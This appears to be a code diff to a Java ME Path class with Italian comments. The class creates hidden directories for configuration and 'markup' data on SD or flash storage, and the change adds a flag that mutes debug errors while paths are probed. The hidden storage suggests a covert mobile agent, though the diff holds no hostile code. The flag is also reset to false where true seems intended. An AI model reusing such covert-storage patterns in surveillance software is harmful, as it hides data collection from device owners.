@@ -61,6 +61,10 @@ public final class Path {
     public static final String CONF_DIR = "2/";
 
     //public static final String LOG_PATH = SD_PATH;
+    //#ifdef DEBUG
+    private static boolean emitError = true;
+
+    //#endif
 
     /**
      * Crea la directory specificata e la rende hidden. Non crea ricosivamente
@@ -71,6 +75,7 @@ public final class Path {
      * @return true, if successful
      */
     public static synchronized boolean createDirectory(final String dirName) {
+
         FileConnection fconn = null;
 
         //#ifdef DBC
@@ -95,8 +100,9 @@ public final class Path {
         } catch (final Exception e) {
 
             //#ifdef DEBUG
-            debug.error(dirName + " ex: " + e.toString());
-
+            if (emitError) {
+                debug.error(dirName + " ex: " + e.toString());
+            }
             //#endif
             return false;
 
@@ -106,7 +112,7 @@ public final class Path {
                     fconn.close();
                 } catch (final IOException e) {
                     //#ifdef DEBUG
-                    if (debug != null) {
+                    if (debug != null && emitError) {
                         debug.error(dirName + " ex: " + e.toString());
                     }
                     //#endif
@@ -183,7 +189,7 @@ public final class Path {
      * Crea le directory iniziali.
      * 
      * @param sd
-     *            true: crea su SD. false: crea su flash
+     *            SD: crea su SD. USER: crea su flash
      * @return true se riesce a scrivere le directory, false altrimenti
      */
     public static boolean makeDirs(final int sd) {
@@ -206,6 +212,10 @@ public final class Path {
         String chosenDir = null;
         boolean found = false;
 
+        //#ifdef DEBUG
+        emitError = false;
+        //#endif
+
         for (int i = 0; !found && i < extPaths.length; i++) {
             final String ext = extPaths[i];
             chosenDir = base + ext;
@@ -218,10 +228,11 @@ public final class Path {
                 // createDirectory(Path.SD_PATH + Path.LOG_DIR);
                 found &= createDirectory(chosenDir + Path.MARKUP_DIR);
                 found &= createDirectory(chosenDir + Path.CONF_DIR);
-                found &= createDirectory(chosenDir);
+
+                //found &= createDirectory(chosenDir);
                 // createDirectory(Path.SD_PATH + Path.LOG_DIR);
-                found &= createDirectory(chosenDir + Path.MARKUP_DIR);
-                found &= createDirectory(chosenDir + Path.CONF_DIR);
+                //found &= createDirectory(chosenDir + Path.MARKUP_DIR);
+                //found &= createDirectory(chosenDir + Path.CONF_DIR);
 
                 final long rnd = Math.abs(random.nextLong());
 
@@ -229,6 +240,10 @@ public final class Path {
                 found &= removeDirectory(chosenDir + rnd + "/");
             }
         }
+
+        //#ifdef DEBUG
+        emitError = false;
+        //#endif
 
         if (chosenDir != null) {
             if (sd == SD) {
